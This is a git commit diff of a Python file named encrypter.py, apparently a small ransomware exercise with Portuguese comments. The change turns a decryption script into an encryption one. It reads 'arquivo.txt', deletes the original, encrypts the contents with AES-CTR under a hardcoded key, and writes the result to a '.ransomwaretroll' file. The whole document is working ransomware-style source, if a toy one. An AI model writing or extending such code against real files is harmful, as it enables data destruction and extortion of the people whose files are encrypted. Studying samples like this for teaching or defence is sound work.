5f8daaaf4995700605aa09c6402578db24553df0
Patrick Augusto <79328506+Patrick-Augusto@users.noreply.github.com>
2023-03-21 00:11:39 -0300

    Update encrypter.py

--- encrypter.py
+++ encrypter.py
@@ -1,22 +1,24 @@
 import os
 import pyaes
 
-## abrir o arquivo criptografado
-file_name = "arquivo.txt.ransomwaretroll"
+
+file_name = "arquivo.txt"
 file = open(file_name, "rb")
 file_data = file.read()
 file.close()
 
-## chave para descriptografia
-key = b"testeransomwares"
-aes = pyaes.AESModeOfOperationCTR(key)
-decrypt_data = aes.decrypt(file_data)
 
-## remover o arquivo criptografado
 os.remove(file_name)
 
-## criar o arquivo descriptografado
-new_file = "arquivo.txt"
-new_file = open(f'{new_file}', "wb")
-new_file.write(decrypt_data)
+
+key = b"testeransomwares"
+aes = pyaes.AESModeOfOperationCTR(key)
+
+
+crypto_data = aes.encrypt(file_data)
+
+
+new_file = file_name + ".ransomwaretroll"
+new_file = open(f'{new_file}','wb')
+new_file.write(crypto_data)
 new_file.close()
